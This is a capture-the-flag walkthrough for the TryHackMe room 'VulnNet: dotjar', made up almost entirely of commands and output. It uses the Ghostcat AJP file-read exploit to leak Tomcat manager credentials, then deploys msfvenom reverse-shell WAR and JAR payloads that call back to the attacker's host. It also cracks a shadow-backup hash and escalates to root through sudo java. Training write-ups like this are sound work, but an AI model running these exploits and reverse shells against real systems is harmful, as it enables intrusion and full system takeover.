
```http
https://tryhackme.com/room/vulnnetdotjar
```

# Network scanning

```
nmap -p- -sC -sV -Pn 10.113.154.96 -v
```


> [!NOTE] Results
> 22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 5c:f3:4f:ec:c4:37:65:39:28:e6:62:61:f2:82:5b:8f (RSA)
|   256 b5:c5:28:37:31:a6:ff:92:e3:30:7f:99:d9:7e:53:48 (ECDSA)
|_  256 f8:39:87:42:9e:0d:f1:54:a6:06:44:e3:07:d1:ab:04 (ED25519)
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http    Apache Tomcat 9.0.30
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Apache Tomcat/9.0.30
|_http-favicon: Apache Tomcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

## Other enum

```
http://10.113.154.96:8080/
```

> [!NOTE]
> Apache Tomcat/9.0.30

## Exploit
```
wget https://github.com/00theway/Ghostcat-CNVD-2020-10487/raw/refs/heads/master/ajpShooter.py
```

```
python3 ajpShooter.py  http://10.113.154.96:8080/ 8009 /WEB-INF/web.xml read
```

```
webdev / Hgj3LA$02D$Fa@21
```

```
gobuster dir -u http://10.113.154.96:8080 -w /usr/share/wordlists/dirb/common.txt
```

```
docs                 (Status: 302) [Size: 0] [--> /docs/]
examples             (Status: 302) [Size: 0] [--> /examples/]
favicon.ico          (Status: 200) [Size: 21630]
host-manager         (Status: 302) [Size: 0] [--> /host-manager/]
manager              (Status: 302) [Size: 0] [--> /manager/]
```


```
http://10.113.154.96:8080/host-manager/html
```

___
___
# RCE

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.208.194 LPORT=1337 -f war > shell.war
```

```
curl -v -u 'webdev:Hgj3LA$02D$Fa@21' --upload-file shell.war 'http://10.113.154.96:8080/manager/text/deploy?path=/foo&update=true'
```

```
nc -lnvp 1337
```

```
curl http://10.113.154.96:8080/foo
```


# LPE

```
web@ip-10-113-154-96:~/apache-tomcat-9.0.30$ hostname
ip-10-113-154-96
```

```
ls -la /var/backups/shadow-backup-alt.gz
```

```
cat shadow-backup-alt.gz | base64
```

```
echo '' | base64 -d  > shadow.gz
```

```
haiti '$6$PQQxGZw5$fSSXp2EcFX0RNNOcu6uakkFjKDDWGw1H35uvQzaH44.I/5cwM0KsRpwIp8OcsOeQcmXJeJAk7SnwY6wV8A0z/1'
```

```
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

```
jdk-admin / 794613852
```

```
ssh jdk-admin@10.113.154.96
```

> [!NOTE]
> FOUND user.txt

```
jdk-admin@ip-10-113-154-96:/tmp$ sudo -l
Password: 
Matching Defaults entries for jdk-admin on ip-10-113-154-96:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jdk-admin may run the following commands on ip-10-113-154-96:
    (root) /usr/bin/java -jar *.jar
```

```
https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-java-privilege-escalation
```

```
msfvenom -p java/shell_reverse_tcp LHOST=192.168.208.194 LPORT=4444 -f jar -o shell.jar
```

```
python3 -m http.server 81 -d .
```

```
wget http://192.168.208.194:81/shell.jar
```

```
nc -lnvp 4444
```

```
sudo /usr/bin/java -jar shell.jar
```

> [!NOTE]
> FOUND root.txt